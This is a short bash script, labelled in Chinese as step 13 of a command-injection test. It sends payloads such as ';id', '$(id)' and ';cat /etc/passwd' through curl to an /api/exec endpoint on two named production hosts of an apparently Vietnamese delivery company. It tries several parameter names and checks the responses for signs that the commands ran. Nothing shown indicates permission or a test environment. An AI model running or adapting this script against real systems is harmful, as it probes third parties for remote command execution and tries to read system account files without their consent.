#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "步骤13：命令注入测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

CMD_PAYLOADS=(
    ";id"
    "|id"
    "\`id\`"
    "\$(id)"
    ";cat /etc/passwd"
)

PARAMS=("cmd" "command" "exec" "system" "shell" "url" "path")

echo "[*] 测试命令注入..."

for target in "admin.giaohangtietkiem.vn" "hrm-api.ghtk.vn"; do
    echo ""
    echo "━━━ $target ━━━"
    for param in "${PARAMS[@]}"; do
        for payload in "${CMD_PAYLOADS[@]}"; do
            encoded=$(echo -n "$payload" | jq -sRr @uri)
            resp=$(curl -sk "https://$target/api/exec?${param}=${encoded}" -m 3 2>&1)
            
            if echo "$resp" | grep -qE "uid=|root:|bin/bash"; then
                echo "  ⚠️  可能存在命令注入: $param=$payload"
                break
            fi
        done
    done
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 命令注入测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
